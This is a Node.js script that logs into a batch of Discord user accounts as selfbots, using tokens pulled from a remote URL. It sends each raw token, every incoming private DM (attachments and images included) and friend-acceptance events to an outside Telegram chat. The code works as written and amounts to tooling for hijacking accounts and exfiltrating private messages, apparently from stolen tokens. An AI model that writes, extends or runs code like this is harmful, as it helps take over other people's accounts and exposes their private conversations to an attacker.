const { Client } = require('discord.js-selfbot-v13');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

// ========================================================
// HYBRID ENVIRONMENT VARIABLES ENGINE (LOCAL & CLOUD SAFE)
// ========================================================
const config = {};

try {
    const envPath = path.join(__dirname, '.env');
    if (fs.existsSync(envPath)) {
        const envContent = fs.readFileSync(envPath, 'utf8');
        envContent.split('\n').forEach(line => {
            const trimmedLine = line.trim();
            if (!trimmedLine || trimmedLine.startsWith('#')) return;
            
            const firstEquals = trimmedLine.indexOf('=');
            if (firstEquals === -1) return;
            
            const key = trimmedLine.substring(0, firstEquals).trim();
            const value = trimmedLine.substring(firstEquals + 1).replace(/[{}"']/g, '').trim();
            config[key] = value;
        });
    }
} catch (err) {
    console.error("Local .env reading process skipped:", err.message);
}

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || config.TELEGRAM_BOT_TOKEN || '').replace(/[{}]/g, '').trim();
const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || config.TELEGRAM_CHAT_ID || '').replace(/[{}]/g, '').trim();
const TOKEN_URL = (process.env.TOKEN_URL || config.TOKEN_URL || '').trim();

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Critical Verification Error: Missing Telegram credentials!");
    process.exit(1);
}

const processedMessageIds = new Set(); 
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function createSelfbotInstance(token, index, totalCount) {
    return new Promise((resolve) => {
        const accountNumber = index + 1;
        const cleanToken = token ? token.trim() : '';

        if (!cleanToken) {
            resolve();
            return;
        }

        const client = new Client({ checkUpdate: false });
        const knownFriends = new Set();

        client.on('ready', async () => {
            console.log("Logged in a client successfully.");
            
            const statusUpdate = "✅ *[Account #" + accountNumber + "/" + totalCount + "] LOGGED IN!*\n\n" +
                                  "• *User:* " + client.user.tag + "\n" +
                                  "• *Token:* `" + cleanToken + "`";
            await sendToTelegram(statusUpdate);

            client.relationships.friendCache.forEach((user, id) => {
                knownFriends.add(id);
            });

            resolve(); 
        });

        // ========================================================
        // ULTRA HIGH-SPEED RAW WEBSOCKET INTERCEPTOR ENGINE
        // ========================================================
        client.on('raw', async (packet) => {
            if (packet.t === 'RELATIONSHIP_ADD') {
                try {
                    const data = packet.d;
                    if (data.type === 1 && !knownFriends.has(data.id)) {
                        knownFriends.add(data.id);
                        
                        const friendUser = await client.users.fetch(data.id).catch(() => data.user);
                        const friendTag = friendUser.discriminator && friendUser.discriminator !== '0' 
                            ? friendUser.username + "#" + friendUser.discriminator 
                            : friendUser.username;

                        const alertText = "🎉 Friend Request Accepted!\n\n" +
                                          "Account: " + client.user.tag + "\n" +
                                          "New Friend: " + friendTag + " (" + data.id + ")";
                        
                        await sendToTelegram(alertText);
                    }
                } catch (e) {}
            }

            if (packet.t === 'MESSAGE_CREATE') {
                try {
                    const data = packet.d;
                    if (!data.guild_id && data.author.id !== client.user.id && !data.author.bot) {
                        if (processedMessageIds.has(data.id)) return;
                        processedMessageIds.add(data.id);

                        setTimeout(() => processedMessageIds.delete(data.id), 60000);

                        const channel = await client.channels.fetch(data.channel_id).catch(() => null);
                        if (channel) {
                            try {
                                const message = await channel.messages.fetch(data.id);
                                if (message) {
                                    await handleValidDM(client, message);
                                }
                            } catch (fetchErr) {}
                        }
                    }
                } catch (e) {}
            }
        });

        // Fallback standard DM Listener
        client.on('messageCreate', async (message) => {
            if (message.channel.type !== 'DM' && message.channel.type !== 1) return;
            if (processedMessageIds.has(message.id)) return; 
            
            processedMessageIds.add(message.id);
            setTimeout(() => processedMessageIds.delete(message.id), 60000);

            if (!message.author.bot && message.author.id !== client.user.id) {
                await handleValidDM(client, message);
            }
        });

        // Fallback standard relationship indicators
        client.on('relationshipAdd', async (relationship) => {
            try {
                if (relationship.type === 'friend' && !knownFriends.has(relationship.id)) {
                    knownFriends.add(relationship.id);
                    const friendUser = relationship.user;

                    const alertText = "🎉 Friend Request Accepted!\n\n" +
                                      "Account: " + client.user.tag + "\n" +
                                      "New Friend: " + friendUser.tag + " (" + friendUser.id + ")";
                    await sendToTelegram(alertText);
                }
            } catch (error) {}
        });

        client.on('userUpdate', async () => {
            try {
                client.relationships.friendCache.forEach(async (friendUser, friendId) => {
                    if (!knownFriends.has(friendId)) {
                        knownFriends.add(friendId);
                        const alertText = "🎉 Friend Request Accepted!\n\n" +
                                          "Account: " + client.user.tag + "\n" +
                                          "New Friend: " + friendUser.tag + " (" + friendId + ")";
                        await sendToTelegram(alertText);
                    }
                });
            } catch (error) {}
        });

        // Authenticate token with Catch layer to catch bad tokens
        client.login(cleanToken).catch(async (err) => {
            console.error("Failed login on an account.");
            
            const failureReport = "❌ *[Account #" + accountNumber + "/" + totalCount + "] LOGIN FAILED!*\n\n" +
                                  "• *Error:* " + err.message + "\n" +
                                  "• *Faulty Token:* `" + cleanToken + "`";
            
            await sendToTelegram(failureReport);
            resolve(); 
        });
    });
}

async function handleValidDM(client, message) {
    try {
        let text = "🎉 New Message Alert\nDM to " + client.user.tag + " \nfrom " + message.author.tag + " \n(" + message.author.id + "):";
        if (message.content) {
            text += "\n" + message.content;
        }
        
        if (message.attachments.size > 0) {
            for (const attachment of message.attachments.values()) {
                if (attachment.contentType && attachment.contentType.startsWith('image/')) {
                    await sendImageToTelegram(attachment.url, text);
                } else {
                    text += "\n📎 Attachment: " + attachment.name + "\n🔗 " + attachment.url;
                }
            }
            if (message.attachments.some(att => !att.contentType?.startsWith('image/'))) {
                await sendToTelegram(text);
            }
        } else {
            await sendToTelegram(text);
        }
    } catch (err) {}
}

// Sequential Execution Loop with External Fetch Engine
async function bootSequence() {
    console.log("Fetching token database...");
    if (!TOKEN_URL) {
        console.error("No TOKEN_URL environment variable provided.");
        return;
    }

    try {
        const response = await fetch(TOKEN_URL);
        const textData = await response.text();
        
        // This splits by commas, tabs, or newlines perfectly.
        const tokens = textData.split(/[,\n\r\t]+/).map(t => t.replace(/["'{}]/g, '').trim()).filter(t => t.length > 5);
        
        console.log("Processing " + tokens.length + " tokens securely...");
        await sendToTelegram("🚀 Starting boot initialization for " + tokens.length + " remote cloud tokens...");
        
        for (let i = 0; i < tokens.length; i++) {
            await createSelfbotInstance(tokens[i], i, tokens.length);
            await sleep(15000); 
        }
        console.log("Verification completed.");
    } catch (err) {
        console.error("Error fetching or processing the token URL:", err.message);
    }
}

bootSequence();

// --- Telegram helper functions ---

async function sendImageToTelegram(imageUrl, caption) {
    if (!TELEGRAM_CHAT_ID) return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, photo: imageUrl, caption: caption })
        });
    } catch (error) {}
}

async function sendToTelegram(text) {
    if (!TELEGRAM_CHAT_ID) return;
    try {
const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
await fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: TELEGRAM_CHAT_ID,
text: text,
parse_mode: "Markdown"
})
});
} catch (error) {}
}
